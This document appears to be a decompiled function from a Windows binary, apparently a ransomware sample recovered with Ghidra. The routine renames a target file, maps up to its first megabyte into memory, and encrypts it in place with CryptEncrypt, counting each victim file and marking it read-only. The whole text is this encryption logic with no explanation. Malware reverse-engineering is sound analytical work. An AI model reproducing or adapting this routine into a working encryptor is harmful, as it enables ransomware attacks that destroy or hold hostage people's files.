
undefined8 __fastcall FUN_00401292(undefined4 param_1,undefined4 param_2,LPCWSTR param_3)

{
  LPVOID pvVar1;
  undefined4 in_EAX;
  BOOL BVar2;
  HANDLE pvVar3;
  int iVar4;
  LPCWSTR lpNewFileName;
  HCRYPTKEY local_20;
  DWORD local_1c;
  uint local_18;
  LPVOID local_14;
  HANDLE local_10;
  uint local_c;
  HANDLE local_8;
  
  lpNewFileName = param_3 + 0x4010;
  BVar2 = MoveFileW(param_3,lpNewFileName);
  if (BVar2 != 0) {
    pvVar3 = CreateFileW(lpNewFileName,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if ((pvVar3 != (HANDLE)0xffffffff) &&
       (local_8 = pvVar3,
       pvVar3 = CreateFileMappingA(pvVar3,(LPSECURITY_ATTRIBUTES)0x0,4,0,0,(LPCSTR)0x0),
       pvVar3 != (HANDLE)0x0)) {
      local_c = *(uint *)(param_3 + 0x8020);
      if (local_c < 0x100000) {
        local_18 = local_c >> 5;
      }
      else {
        local_c = 0x100000;
        local_18 = 0x51ea;
      }
      local_10 = pvVar3;
      local_14 = MapViewOfFile(pvVar3,2,0,0,local_c);
      if (local_14 != (LPVOID)0x0) {
        CryptDuplicateKey(DAT_00404b20,(DWORD *)0x0,0,&local_20);
        pvVar1 = local_14;
        iVar4 = 0;
        local_1c = 0x20;
        do {
          CryptEncrypt(local_20,0,0,0,(BYTE *)(iVar4 * 0x20 + (int)pvVar1),&local_1c,0x20);
          iVar4 = iVar4 + 1;
          local_18 = local_18 - 1;
        } while (local_18 != 0);
        UnmapViewOfFile(local_14);
        CloseHandle(local_10);
        CloseHandle(local_8);
        DAT_00404b48 = DAT_00404b48 + 1;
        CryptDestroyKey(local_20);
        SetFileAttributesW(param_3 + 0x4010,1);
        goto LAB_004013de;
      }
      CloseHandle(local_10);
      CloseHandle(local_8);
    }
    MoveFileW(param_3 + 0x4010,param_3);
  }
LAB_004013de:
  return CONCAT44(param_2,in_EAX);
}
